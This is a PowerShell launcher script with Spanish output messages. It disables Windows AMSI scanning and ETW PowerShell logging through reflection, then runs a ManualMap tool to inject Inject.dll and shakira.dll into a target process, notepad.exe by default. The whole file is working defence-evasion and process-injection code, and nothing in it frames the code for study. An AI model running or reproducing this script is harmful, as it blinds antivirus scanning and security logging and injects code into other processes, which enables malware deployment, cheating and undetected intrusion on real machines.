param(
    [string]$ManualMapPath = "C:\Users\ccsgo\Downloads\ManualMap.exe",
    [string]$InjectDllPath = "C:\Users\ccsgo\Downloads\Inject.dll",
    [string]$TargetDllPath = "C:\Users\ccsgo\Downloads\shakira.dll",
    [string]$ProcessName   = "notepad.exe"
)

# Bypass AMSI + ETW
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etw.GetField('etwProvider','NonPublic,Static').SetValue($null,$null)

Write-Host "[+] Bypass aplicados" -ForegroundColor Green

# Validaciones detalladas
if (-not (Test-Path $ManualMapPath)) { 
    Write-Host "[!] No se encontró ManualMap.exe" -ForegroundColor Red
    pause; exit 1 
}
if (-not (Test-Path $InjectDllPath)) { 
    Write-Host "[!] No se encontró Inject.dll" -ForegroundColor Red
    pause; exit 1 
}
if (-not (Test-Path $TargetDllPath)) { 
    Write-Host "[!] No se encontró shakira.dll" -ForegroundColor Red
    pause; exit 1 
}

Write-Host "[+] Todo listo. Ejecutando ManualMap..." -ForegroundColor Cyan
Write-Host "   Inject.dll  → $InjectDllPath" -ForegroundColor Gray
Write-Host "   shakira.dll → $TargetDllPath" -ForegroundColor Gray
Write-Host "   Proceso     → $ProcessName" -ForegroundColor Gray

try {
    $arguments = "`"$InjectDllPath`" `"$ProcessName`" `"$TargetDllPath`""
    $p = Start-Process -FilePath $ManualMapPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
    
    Write-Host "[+] ManualMap terminó con código: $($p.ExitCode)" -ForegroundColor Green
} catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`nPresiona cualquier tecla para cerrar..." -ForegroundColor Yellow
pause